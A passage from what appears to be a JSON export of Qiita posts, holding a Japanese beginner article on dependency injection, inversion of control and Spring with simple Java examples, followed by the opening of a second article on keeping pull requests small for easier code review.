class=\"o\">}</span>\n</code></pre></div></div>\n<ul data-sourcepos=\"307:1-308:0\">\n<li data-sourcepos=\"307:1-308:0\">Service Locator</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"309:1-318:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    \n    <span class=\"kd\">public</span> <span class=\"nf\">SalmonRestaurant</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// 自ら取得しに行く（能動的）</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"nc\">ServiceLocator</span><span class=\"o\">.</span><span class=\"na\">getService</span><span class=\"o\">(</span><span class=\"nc\">Chef</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"320:1-320:182\">この記事が書かれたのは2004年で、20年が経過した現在、Service Locator方式は管理が難しいためあまり使用されず、DIが主流となりました。</p>\n<p data-sourcepos=\"322:1-322:111\">なぜなら、Service Locator方式では、依存性の流れを開発者が把握しづらいからです。</p>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"324:1-329:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">public</span> <span class=\"nf\">SalmonRestaurant</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// コードの中身を見て初めて、Chefに依存していることが分かる</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"nc\">ServiceLocator</span><span class=\"o\">.</span><span class=\"na\">getService</span><span class=\"o\">(</span><span class=\"nc\">Chef</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<ul data-sourcepos=\"330:1-333:0\">\n<li data-sourcepos=\"330:1-331:0\">\n<p data-sourcepos=\"330:3-330:137\"><code>Chef</code>が登録されていなくてもコンパイルは通りますが、実行時（ランタイム）に問題が発生します。</p>\n</li>\n<li data-sourcepos=\"332:1-333:0\">\n<p data-sourcepos=\"332:3-332:109\">テスト時に、グローバルなServiceLocatorの状態を毎回設定しなければなりません。</p>\n</li>\n</ul>\n<p data-sourcepos=\"334:1-334:158\">このような問題などから、現代ではDIを通じた明確で宣言的な管理方式が主流となり、Springはこれを採用しています。</p>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"336:1-351:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Spring </span>\n<span class=\"nd\">@Component</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Restaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    \n    <span class=\"c1\">// Springが自動的にSalmonChefを注入してくれます</span>\n    <span class=\"kd\">public</span> <span class=\"nf\">Restaurant</span><span class=\"o\">(</span><span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    \n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">serve</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">chef</span><span class=\"o\">.</span><span class=\"na\">cook</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n</div>\n</div>\n<h2 data-sourcepos=\"354:1-354:56\">\n<span id=\"diコンテナの核心となる動作原理とは\" class=\"fragment\"></span><a href=\"#di%E3%82%B3%E3%83%B3%E3%83%86%E3%83%8A%E3%81%AE%E6%A0%B8%E5%BF%83%E3%81%A8%E3%81%AA%E3%82%8B%E5%8B%95%E4%BD%9C%E5%8E%9F%E7%90%86%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>DIコンテナの核心となる動作原理とは？</h2>\n<p data-sourcepos=\"356:1-356:68\">DIコンテナの核心となる動作原理は次の通りです。</p>\n<ul data-sourcepos=\"358:1-367:0\">\n<li data-sourcepos=\"358:1-360:0\">\n<p data-sourcepos=\"358:3-358:24\">設定 (Configuration)</p>\n<ul data-sourcepos=\"359:5-360:0\">\n<li data-sourcepos=\"359:5-360:0\">どの実装体を使用するかを設定</li>\n</ul>\n</li>\n<li data-sourcepos=\"361:1-363:0\">\n<p data-sourcepos=\"361:3-361:37\">オブジェクト生成 (Creation)</p>\n<ul data-sourcepos=\"362:5-363:0\">\n<li data-sourcepos=\"362:5-363:0\">DIコンテナがオブジェクトを生成</li>\n</ul>\n</li>\n<li data-sourcepos=\"364:1-367:0\">\n<p data-sourcepos=\"364:3-364:32\">依存関係注入 (Injection)</p>\n<ul data-sourcepos=\"365:5-367:0\">\n<li data-sourcepos=\"365:5-367:0\">生成したオブジェクトを必要な場所に注入する</li>\n</ul>\n</li>\n</ul>\n<p data-sourcepos=\"368:1-368:143\">Javaでは、これを <strong>Java Reflection API</strong> を活用して、ランタイムに動的にオブジェクトを生成し、注入します。</p>\n<p data-sourcepos=\"370:1-370:207\">次回の記事では、Springにおいて設定、オブジェクト生成、依存関係注入がどのように実装され、使用されているのかについて整理してみたいと思います。</p>\n",
      "body": "> **Note**\n> - 私は韓国でプログラミングと日本語を勉強している学生です\n> - 日本語がまだ不慣れなため、翻訳には機械翻訳を使用しました。もし不自然な点や間違いがありましたら、ご指摘いただけると幸いです\n\n\n## ファクトリーメソッドパターンの限界\n\nhttps://qiita.com/haroya01/items/25ff80f58021b6ad69a7\n\n前回の記事でファクトリーメソッドパターンについて整理した際、「誰」が `new` を通じてオブジェクトを生成するのかという問題がありました。\n\n前回の内容を振り返ると、\n\n- 結局、結合が移動しただけであり、解決されたわけではない\n```java\n// どこかで結局呼び出される\nmap.put(\"サーモン\", new SalmonRestaurant());\n```\n新しいメニューが追加されると、結局、開発者が RestaurantMap クラスを開いて static ブロックの中に直接 new を呼び出すコードを追加しなければなりません。\n\nつまり、ファクトリーをファクトリーでラップし、いくら抽象化を行っても、プログラムのどこかでは必ず new を通じてオブジェクトを生成しなければなりません。\n\nこの問題を解決する方法こそが、DI (Dependency Injection) コンテナ です。\n\n本日は、DIコンテナについて詳しく整理し、Springではどのようになっているか、一度確認してみたいと思います。\n\n# DIとは？\n> Dependency Injection（依存性の注入）の略で、\n自分が必要とする依存性を直接生成せず、外部から受け取る設計パターンのことです。\n\n:::note info\n### 依存性（Dependency）とは？\n- あるオブジェクトAが、別のオブジェクトBの機能を使用するために参照する関係を「AはBに依存する」と言います\n```java\npublic class A {\n    private B b;  // AはBなしでは動作できない = AがBに依存\n}\n```\n:::\n\n\n### DIのないコード：密結合（Tight Coupling）\n\n```java\n// DIのないコード\npublic class SalmonRestaurant {\n    private SalmonChef chef;\n\n    public SalmonRestaurant() {\n        // [問題点] 依存するオブジェクト(Chef)を自ら直接生成している（密結合）\n        // もしTunaChefに変更したい場合、このコードを修正しなければならない\n        this.chef = new SalmonChef();\n    }\n\n    public void serve() {\n        chef.cook();\n    }\n}\n```\n上記のコードの問題点は、`Restaurant`が`Chef`を直接 `new` で生成しているという点です。 メニューを変更するには内部コードを修正する必要があるため、これは強い依存性、つまり密結合を意味します\n\n### DIを適用したコード：疎結合（Loose Coupling）\n\n```java\n// DIありのコード\npublic class SalmonRestaurant {\n    // 具体的なクラス(SalmonChef)ではなく、インターフェース(Chef)に依存\n    private Chef chef;\n\n    // [解決] コンストラクタを通じて外部から依存性を注入される（Constructor Injection）\n    public SalmonRestaurant(Chef chef) {\n        this.chef = chef;\n    }\n\n    public void serve() {\n        chef.cook();\n    }\n}\n\n// --- 使用する場所（外部）---\n// 外部でオブジェクトを生成して渡す\nChef myChef = new SalmonChef(); \nSalmonRestaurant restaurant = new SalmonRestaurant(myChef); // 注入！\n```\n\nこれで `Restaurant` は具象クラスではなく、`Chef` インターフェースに依存するようになりました。\n\n## DIによって得られるメリット\n\n- 結合度の低下\nこの部分は、ファクトリーメソッドパターンのメリットで触れた内容と同じです。\n\nすべてのデザインパターンは、拡張に対しては開いており、変更に対しては閉じているようにすることで、\n\nドメインを重点的に開発できるようにするための仕組みだからです。\n\n```java\npublic class SalmonRestaurant {\n    private SalmonChef chef = new SalmonChef();\n    // ...\n}\n```\n\n上記のようなコードの場合、TunaChefに変更したければ、`Restaurant` コードを必ず修正しなければならないという問題が生じます。\n\n```java\n// TunaChefに変更したい場合、SalmonRestaurantのコードを修正する必要がある\nprivate TunaChef chef = new TunaChef();  // コードの変更が必要\n```\n\n```java\npublic interface Chef {\n    void cook();\n}\n\npublic class SalmonChef implements Chef {\n    public void cook() { System.out.println(\"サーモン料理\"); }\n}\n\npublic class TunaChef implements Chef {\n    public void cook() { System.out.println(\"マグロ料理\"); }\n}\n\npublic class SalmonRestaurant {\n    private Chef chef;  // インターフェースに依存\n    \n    public SalmonRestaurant(Chef chef) {\n        this.chef = chef;\n    }\n    \n    public void serve() {\n        chef.cook();\n    }\n}\n```\n\nしかし、次のようにDI（依存性の注入）を使用すれば、DIP（依存性逆転の原則）を実現し、結合度を下げ、拡張に対して柔軟になることができます。\n\n:::note info\n### DIとDIPの違い\n- **DIP (Dependency Inversion Principle)** : 上位モジュールが下位モジュールに直接依存せず、両方が抽象化（インターフェース）に依存すべきであるという「設計原則」\n- **DI (Dependency Injection)** : DIPを実現するために、外部から依存性を注入する「具体的な手法」\n\nつまり、DIPは抽象化された概念であり、DIはDIPを実現する方法の一つです。\n:::\n\n- テストの容易性\nこれは先ほどのコードと説明から繋がります。\nDIがないとテストを行うのが難しくなります。\n\n例えば、Chefに直接メールを送信するようなビジネスロジックがあると仮정してみましょう。\n\n```java\npublic class SalmonRestaurant {\n    private SalmonChef chef = new SalmonChef();  // 直接生成\n    \n    public void call() {\n        chef.call(1111-1111);\n    }\n}\n\n@Test\nvoid calltest() {\n      SalmonRestaurant restaurant = new SalmonRestaurant();\n      restaurant.call(); // 実際に連絡が行ってしまう\n}\n```\n次のように、コード内に外部依存性（このコードではシェフへの連絡でしたが、DB依存や外部API依存など）があると、テストコードを実行するたびに問題が発生するでしょう。\n\nしかし、DIを活用すれば、Mockオブジェクトを簡単に注入できるため、テストを容易に行うことができます。\n\n```java\n// DIありのコード\npublic class SalmonRestaurant {\n    private Chef chef;\n    \n    public SalmonRestaurant(Chef chef) {\n        this.chef = chef;\n    }\n    \n    public void call() {\n        chef.call(1111-1111);\n    }\n}\n\n@Test\nvoid callTest() {\n    // モックのChefを注入\n    Chef mockChef = mock(Chef.class);\n    SalmonRestaurant restaurant = new SalmonRestaurant(mockChef);\n    \n    restaurant.call();  // 実際に電話はかからない！\n    \n    // call()が呼び出されたかだけを検証\n    verify(mockChef).call(1111-1111);\n}\n```\nこのように、依存性逆転を通じてモックオブジェクトを利用し、簡単にテストを行うことができます。\n\n- 柔軟な構成 (OCP)\n\nOCPの原則も、上記の説明と繋がっています。先ほどの結合度を下げたコードで見たように、拡張が容易になります。これについては先ほど説明しましたので、詳細な説明は省略します。\n\n:::note info\n### OCPとは？\n> Open for extension, Closed for modification\n拡張に対しては開いており、修正に対しては閉じているべきである\n\nつまり、新しい機能が追加される際には、既存のコードを修正することなく拡張できなければなりません。\n:::\n\n# DIコンテナとは？\n\n> DIコンテナは、オブジェクトの生成、依存性の注入、ライフサイクル管理を自動的に行ってくれるフレームワーク、またはライブラリです。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3815412/8fac1f41-4d34-4d2b-9ca9-0c9b13443c0a.png)\n\n以前のコードで見たように、コードのどこかでは必ず、オブジェクトの生成と注入を開発者が責任を持って行わなければなりませんでした。\n\n```java\n// 開発者が直接すべて行わなければなりません\nChef chef = new SalmonChef();\nSalmonRestaurant restaurant = new SalmonRestaurant(chef);\n```\nこれを自動的に管理してくれるのが、DIコンテナです。\nJavaでは、代表的なものとしてSpringが使われています。\n\n```java\n@Component\npublic class SalmonChef implements Chef { }\n\n@Component\npublic class SalmonRestaurant {\n    private final Chef chef;\n    \n    public SalmonRestaurant(Chef chef) {  // Springが自動で注入\n        this.chef = chef;\n    }\n}\n```\n\n### DIコンテナによって何が得られるのか？\n> Because dependency injection separates how objects are constructed from how they are used, it often diminishes the importance of the new keyword found in most object-oriented languages. Because the framework handles creating services, the programmer tends to only directly construct value objects which represents entities in the program's domain (such as an Employee object in a business app or an Order object in a shopping app).\n\nhttps://en.wikipedia.org/wiki/Dependency_injection\n\nついに、開発者がオブジェクトの生成を逐一担当しなくても、DIコンテナがオブジェクトの生成・注入を担当してくれるため、開発者はビジネスロジックだけに集中できるようになりました。\n\nこのように、オブジェクトの生成と注入 ＋（管理）の責任を、開発者ではなくコンテナ（フレームワーク、ライブラリ）に委ねることを、まさに **制御の反転（IoC, Inversion of Control）** と呼びます。\n\n# 制御の反転 (IoC)\n\n> In software design, inversion of control (IoC) is a design principle in which custom-written portions of a computer program receive the flow of control from an external source (e.g. a framework). The term \"inversion\" is historical: a software architecture with this design \"inverts\" control as compared to procedural programming. In procedural programming, a program's custom code calls reusable libraries to take care of generic tasks, but with inversion of control, it is the external code or framework that is in control and calls the custom code.\n\nこの内容を簡単に整理すると、\nIoCとは、開発者が作成したコードが外部（フレームワークなど）から制御の流れを受け取る設計原則です。\n\nつまり、私がフレームワークを呼び出すのではなく、フレームワークが私のコードを呼び出すという意味です。\n\n:::note info \n### なぜ制御の「反転」なのか？\n手続き型プログラミングの時代では、私がフレームワークを呼び出していましたが、IoC設計方式を持つソフトウェアアーキテクチャでは、フレームワークが私のコードを呼び出します。\nつまり、制御方式が以前とは「逆」なのです。\nこれを制御の「反転」と言います。\n:::\n\n\nhttps://en.wikipedia.org/wiki/Inversion_of_control\n\n## IoCとDIの関係\n\n### DIとIoCの違い\n\n- IoCは抽象的な概念です\n- DIはIoCを実現する具体的な方法の一つです\n\nこの用語の違いに関する説明は、DDDの父、マーティン・ファウラーのブログに記されています。\n\nhttps://martinfowler.com/articles/injection.html\n\n> In the Java community there's been a rush of lightweight containers that help to assemble components from different projects into a cohesive application. Underlying these containers is a common pattern to how they perform the wiring, a concept they refer under the very generic name of “Inversion of Control”. In this article I dig into how this pattern works, under the more specific name of “Dependency Injection”, and contrast it with the Service Locator alternative. The choice between them is less important than the principle of separating configuration from use.\n\n昔々、Javaコミュニティでは様々な軽量コンテナが登場しました。\n\nこれらのコンテナの基盤には、コンポーネント同士を連結する共通のパターンがあり、これを「Inversion of Control（制御の反転）」という非常に一般的な名前で呼んでいました。\n\nマーティン・ファウラーはこの記事の中で、「Dependency Injection（依存性の注入）」という、より具体的な名前で掘り下げ、Service Locatorという代替案と比較しています。\n\n何を（どのパターンを）選択するかということよりも、設定（configuration）と使用（use）を分離する原則の方がより重要です。\n\n:::note info\n### Service Locatorとは？（DIの代替案）\nサービスを探す処理を中央で一括して行う方式のことです。\n\n- DI(Dependency Injection)\n```java\npublic class SalmonRestaurant {\n    private final Chef chef;\n    \n    // 外部から注入される（受動的）\n    public SalmonRestaurant(Chef chef) {\n        this.chef = chef;\n    }\n}\n```\n\n- Service Locator\n\n```java\npublic class SalmonRestaurant {\n    private final Chef chef;\n    \n    public SalmonRestaurant() {\n        // 自ら取得しに行く（能動的）\n        this.chef = ServiceLocator.getService(Chef.class);\n    }\n}\n```\n\nこの記事が書かれたのは2004年で、20年が経過した現在、Service Locator方式は管理が難しいためあまり使用されず、DIが主流となりました。\n\nなぜなら、Service Locator方式では、依存性の流れを開発者が把握しづらいからです。\n\n```java\npublic SalmonRestaurant() {\n    // コードの中身を見て初めて、Chefに依存していることが分かる\n    this.chef = ServiceLocator.getService(Chef.class);\n}\n```\n- `Chef`が登録されていなくてもコンパイルは通りますが、実行時（ランタイム）に問題が発生します。\n\n- テスト時に、グローバルなServiceLocatorの状態を毎回設定しなければなりません。\n\nこのような問題などから、現代ではDIを通じた明確で宣言的な管理方式が主流となり、Springはこれを採用しています。\n\n```java\n// Spring \n@Component\npublic class Restaurant {\n    private final Chef chef;\n    \n    // Springが自動的にSalmonChefを注入してくれます\n    public Restaurant(Chef chef) {\n        this.chef = chef;\n    }\n    \n    public void serve() {\n        chef.cook();\n    }\n}\n```\n:::\n\n## DIコンテナの核心となる動作原理とは？\n\nDIコンテナの核心となる動作原理は次の通りです。\n\n- 設定 (Configuration)\n    - どの実装体を使用するかを設定\n\n- オブジェクト生成 (Creation)\n    - DIコンテナがオブジェクトを生成\n\n- 依存関係注入 (Injection)\n    - 生成したオブジェクトを必要な場所に注入する\n\n\nJavaでは、これを **Java Reflection API** を活用して、ランタイムに動的にオブジェクトを生成し、注入します。\n\n次回の記事では、Springにおいて設定、オブジェクト生成、依存関係注入がどのように実装され、使用されているのかについて整理してみたいと思います。\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:24:17+09:00",
      "group": null,
      "id": "9756bc0eb328fb9a78d6",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Java",
          "versions": []
        },
        {
          "name": "初心者",
          "versions": []
        },
        {
          "name": "Spring,",
          "versions": []
        },
        {
          "name": "DI,",
          "versions": []
        },
        {
          "name": "IoC,",
          "versions": []
        }
      ],
      "title": "DI(依存性の注入)とIoC(制御の反転)の概念整理",
      "updated_at": "2025-12-09T14:25:01+09:00",
      "url": "https://qiita.com/haroya01/items/9756bc0eb328fb9a78d6",
      "user": {
        "description": "日本での就職準備中です。",
        "facebook_id": "",
        "followees_count": 9,
        "followers_count": 7,
        "github_login_name": "haroya01",
        "id": "haroya01",
        "items_count": 43,
        "linkedin_id": "kim-donghyun-8502a42b4/",
        "location": "busan",
        "name": "キム  ドンヒョン",
        "organization": "injeUniv",
        "permanent_id": 3815412,
        "profile_image_url": "https://avatars.githubusercontent.com/u/128161745?v=4",
        "team_only": false,
        "twitter_screen_name": "_haroya01",
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h2 data-sourcepos=\"1:1-1:81\">\n<span id=\"レビューをされる側する側どちらもストレスを感じる\" class=\"fragment\"></span><a href=\"#%E3%83%AC%E3%83%93%E3%83%A5%E3%83%BC%E3%82%92%E3%81%95%E3%82%8C%E3%82%8B%E5%81%B4%E3%81%99%E3%82%8B%E5%81%B4%E3%81%A9%E3%81%A1%E3%82%89%E3%82%82%E3%82%B9%E3%83%88%E3%83%AC%E3%82%B9%E3%82%92%E6%84%9F%E3%81%98%E3%82%8B\"><i class=\"fa fa-link\"></i></a>レビューをされる側、する側どちらもストレスを感じる。</h2>\n<p data-sourcepos=\"3:1-3:119\">PRのレビュー待ち。開発者なら誰もが経験する、あのモヤモヤ、ドキドキした時間です。</p>\n<p data-sourcepos=\"5:1-7:64\"><strong>「いつレビューしてもらえるんだろう」</strong><br>\n<strong>「どこを指摘されるんだろう」</strong><br>\n<strong>「修正にどれくらい時間がかかるんだろう」</strong></p>\n<p data-sourcepos=\"9:1-9:75\">レビューを待つ側のストレスは想像に難くありません。</p>\n<p data-sourcepos=\"11:1-11:102\">それと同時にレビューする側も同じくらい作業のストレスを抱えています。</p>\n<p data-sourcepos=\"13:1-15:57\"><strong>- PRのコンテキストを理解する</strong><br>\n<strong>- コード全体をチェックする</strong><br>\n<strong>- 場合によっては実際に動作確認をする</strong></p>\n<p data-sourcepos=\"17:1-17:206\">AIがコードを書いてくれるようになっても、人間がコードをレビューするという工程はしばらくなくならないため、この負担が消えることはありません。</p>\n<p data-sourcepos=\"19:1-19:152\">ではPRを作る側、レビュー側の両方の負担が小さくなり、お互いが幸せになるにはどうしたら良いのでしょうか？</p>\n<h2 data-sourcepos=\"21:1-21:50\">\n<span id=\"解決策はシンプルprを小さくする\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E7%AD%96%E3%81%AF%E3%82%B7%E3%83%B3%E3%83%97%E3%83%ABpr%E3%82%92%E5%B0%8F%E3%81%95%E3%81%8F%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>解決策はシンプル：PRを小さくする</h2>\n<p data-sourcepos=\"23:1-23:132\">結論から言えば、<strong>PRをなるべく小さくして、レビュアーの負担を減らす</strong>ことが最も効果的です。</p>\n<p data-sourcepos=\"25:1-26:118\">レビュアーはPRレビューが自分に依頼されたことは認識しています。<br>\nではなぜすぐにレビューをしてくれないのか。<strong>それは後回しにされているからです。</strong></p>\n<p data-sourcepos=\"28:1-28:162\">レビュー依頼の通知が来る→PRをさっと見る→「複雑そう。ちょっとめんどくさい。」→<strong>よし後で時間とってやろう！</strong></p>\n<p data-sourcepos=\"30:1-31:105\">エンジニアなら誰もがこのような行為を行ったことがあると思います。　自分もよくやります。(だめ)<br>\nしかし、<strong>すべてのPRで上記のように先延ばしするわけではない</strong>と思います。</p>\n<p data-sourcepos=\"33:1-33:240\">例えば変数名が変わってるだけであったり、テストコードがちょっと追加されたとかだったり、内容が簡単であったり、小さかったりするとすぐに承認することができますよね。</p>\n<p data-sourcepos=\"35:1-35:231\"><strong>要はそのPRが複雑で、時間がかかると思われているからすぐに見てもらえないわけです。</strong>(レビューのリソースが...プロジェクトのスケジュールが... とかは置いておいて)</p>\n<h2 data-sourcepos=\"37:1-37:66\">\n<span id=\"レビューが遅いことがもたらす弊害は実は多い\" class=\"fragment\"></span><a href=\"#%E3%83%AC%E3%83%93%E3%83%A5%E3%83%BC%E3%81%8C%E9%81%85%E3%81%84%E3%81%93%E3%81%A8%E3%81%8C%E3%82%82%E3%81%9F%E3%82%89%E3%81%99%E5%BC%8A%E5%AE%B3%E3%81%AF%E5%AE%9F%E3%81%AF%E5%A4%9A%E3%81%84\"><i class=\"fa fa-link\"></i></a>レビューが遅いことがもたらす弊害は実は多い</h2>\n<p data-sourcepos=\"39:1-39:167\">上記のようにPRレビューが後回しになってしまう状態は、チーム、ひいては組織に思っている以上の不利益をもたらします。</p>\n<h3 data-sourcepos=\"41:1-41:58\">\n<span id=\"1-リリースの遅延とビジネス機会の損失\" class=\"fragment\"></span><a href=\"#1-%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9%E3%81%AE%E9%81%85%E5%BB%B6%E3%81%A8%E3%83%93%E3%82%B8%E3%83%8D%E3%82%B9%E6%A9%9F%E4%BC%9A%E3%81%AE%E6%90%8D%E5%A4%B1\"><i class=\"fa fa-link\"></i></a>1. リリースの遅延とビジネス機会の損失</h3>\n<p data-sourcepos=\"43:1-43:426\">まず、シンプルに**リリースが遅れます。**本来その変更が本番環境に反映され、ユーザーに価値を届けるはずだった時間が失われます。新機能であれば収益化の機会を逃し、バグ修正であればユーザー体験の改善が遅れます。レビュー待ちの1日が、<strong>ビジネスにとって大きな機会損失</strong>になっているかもしれません。</p>\n<h3 data-sourcepos=\"45:1-45:55\">\n<span id=\"2-コンテキストスイッチングのコスト\" class=\"fragment\"></span><a href=\"#2-%E3%82%B3%E3%83%B3%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%E3%82%B9%E3%82%A4%E3%83%83%E3%83%81%E3%83%B3%E3%82%B0%E3%81%AE%E3%82%B3%E3%82%B9%E3%83%88\"><i class=\"fa fa-link\"></i></a>2. コンテキストスイッチングのコスト</h3>\n<p data-sourcepos=\"47:1-47:402\">レビューが遅れると、PRを出した開発者は別のタスクに取り掛かります。そして数日後にレビューコメントが返ってくると、「あれ、これ何だっけ？」と再度コンテキストを思い出す必要があります。この<strong>コンテキストスイッチング</strong>は想像以上に認知的負荷が高く、生産性を大きく低下させます。</p>\n<h3 data-sourcepos=\"49:1-49:52\">\n<span id=\"3-マージコンフリクトのリスク増大\" class=\"fragment\"></span><a href=\"#3-%E3%83%9E%E3%83%BC%E3%82%B8%E3%82%B3%E3%83%B3%E3%83%95%E3%83%AA%E3%82%AF%E3%83%88%E3%81%AE%E3%83%AA%E3%82%B9%E3%82%AF%E5%A2%97%E5%A4%A7\"><i class=\"fa fa-link\"></i></a>3. マージコンフリクトのリスク増大</h3>\n<p data-sourcepos=\"51:1-51:318\">レビューが遅れている間に、他のPRがマージされていきます。時間が経てば経つほど、**コンフリクトが発生する可能性が高まります。**コンフリクトの解消には時間がかかり、場合によっては再度レビューが必要になることもあります。</p>\n<h3 data-sourcepos=\"53:1-53:46\">\n<span id=\"4-チームの心理的安全性の低下\" class=\"fragment\"></span><a href=\"#4-%E3%83%81%E3%83%BC%E3%83%A0%E3%81%AE%E5%BF%83%E7%90%86%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E3%81%AE%E4%BD%8E%E4%B8%8B\"><i class=\"fa fa-link\"></i></a>4. チームの心理的安全性の低下</h3>\n<p data-sourcepos=\"55:1-55:349\">レビュー待ちが常態化すると、「どうせすぐにレビューされないし」という諦めの空気が生まれます。これは<strong>チームの心理的安全性を損ない、コミュニケーションの質を低下</strong>させます。逆に、スムーズなレビューサイクルはチームの信頼関係を強化します。</p>\n<h3 data-sourcepos=\"57:1-57:31\">\n<span id=\"5-技術的負債の蓄積\" class=\"fragment\"></span><a href=\"#5-%E6%8A%80%E8%A1%93%E7%9A%84%E8%B2%A0%E5%82%B5%E3%81%AE%E8%93%84%E7%A9%8D\"><i class=\"fa fa-link\"></i></a>5. 技術的負債の蓄積</h3>\n<p data-sourcepos=\"58:1-58:382\">これは大きなPRの弊害になりますが、<strong>大きなPRは、レビュワーが細部まで確認できないまま承認される</strong>ことがあります。「とりあえず動いているからいいか」という妥協が積み重なり、気づけば技術的負債が山積みに。小さなPRであれば、品質を担保しながら素早くマージできます。</p>\n<p data-sourcepos=\"60:1-60:227\">これらの問題を解決する鍵は、やはり**「小さなPR」**にあります。次のセクションでは、具体的にどうすればPRを小さく保てるのか、実践的な方法を見ていきましょう。</p>\n<h2 data-sourcepos=\"62:1-62:27\">\n<span id=\"具体的な実践方法\" class=\"fragment\"></span><a href=\"#%E5%85%B7%E4%BD%93%E7%9A%84%E3%81%AA%E5%AE%9F%E8%B7%B5%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>具体的な実践方法</h2>\n<h3 data-sourcepos=\"64:1-64:36\">\n<span id=\"1-10分ルールを意識する\" class=\"fragment\"></span><a href=\"#1-10%E5%88%86%E3%83%AB%E3%83%BC%E3%83%AB%E3%82%92%E6%84%8F%E8%AD%98%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>1. 10分ルールを意識する</h3>\n<p data-sourcepos=\"66:1-66:187\">レビューが10分以内で終わるサイズを目指しましょう。これは経験則ですが、10分を超えると集中力が途切れ、レビューの質も低下します。</p>\n<p data-sourcepos=\"68:1-68:276\">単にレビュアーがコードを読む時間だけでなく、それらの内容をネットで調べたり、公式ドキュメントを参照したり、動作確認をしたりなどレビューに関わるそれらの時間を<strong>すべて含めて10分以内</strong>です。</p>\n<h3 data-sourcepos=\"70:1-70:51\">\n<span id=\"2-一つのprには一つのコンテキスト\" class=\"fragment\"></span><a href=\"#2-%E4%B8%80%E3%81%A4%E3%81%AEpr%E3%81%AB%E3%81%AF%E4%B8%80%E3%81%A4%E3%81%AE%E3%82%B3%E3%83%B3%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88\"><i class=\"fa fa-link\"></i></a>2. 一つのPRには一つのコンテキスト</h3>\n<p data-sourcepos=\"72:1-72:180\"><strong>修正や追加する内容のコンテキストは、あくまで一つ</strong>に絞ります。コンテキストや目的が異なる場合は、迷わずPRを分けましょう。</p>\n<p data-sourcepos=\"74:1-74:12\">例えば：</p>\n<ul data-sourcepos=\"75:1-77:0\">\n<li data-sourcepos=\"75:1-75:68\">❌ 「ログイン機能の改善 + UIの調整 + バグ修正」</li>\n<li data-sourcepos=\"76:1-77:0\">✅ 「ログイン機能のバリデーション強化」「ログイン画面のレイアウト調整」「〇〇画面の表示バグ修正」</li>\n</ul>\n<p data-sourcepos=\"78:1-78:207\">コンテキストが複数あると、今読んできる変更がどのコンテキストに対して必要なコードなのかが分かりづらく、レビュアーの負担になってしまいます。</p>\n<h3 data-sourcepos=\"80:1-80:66\">\n<span id=\"3-セルフレビューを徹底しprを補完していく\" class=\"fragment\"></span><a href=\"#3-%E3%82%BB%E3%83%AB%E3%83%95%E3%83%AC%E3%83%93%E3%83%A5%E3%83%BC%E3%82%92%E5%BE%B9%E5%BA%95%E3%81%97pr%E3%82%92%E8%A3%9C%E5%AE%8C%E3%81%97%E3%81%A6%E3%81%84%E3%81%8F\"><i class=\"fa fa-link\"></i></a>3. セルフレビューを徹底し、PRを補完していく</h3>\n<p data-sourcepos=\"82:1-82:95\">PRを出す前に、何も知らない人になりきってレビューしてみましょう。</p>\n<p data-sourcepos=\"84:1-85:54\"><strong>- コードだけでは読み取れないコンテキストがありませんか？</strong><br>\n<strong>- 引っかかった部分はありませんか？</strong></p>\n<p data-sourcepos=\"87:1-87:164\">引っかかったところで参考文献を貼ったり、悩んだポイントをPRのコメントに残すことで、レビュアーの理解を助けます。</p>\n<p data-sourcepos=\"89:1-89:177\">レビュアーになりきった状態で、そのレビュアーがどんなことを調べるだろうか？どこでレビューが止まるかを先読みするのです。</p>\n<p 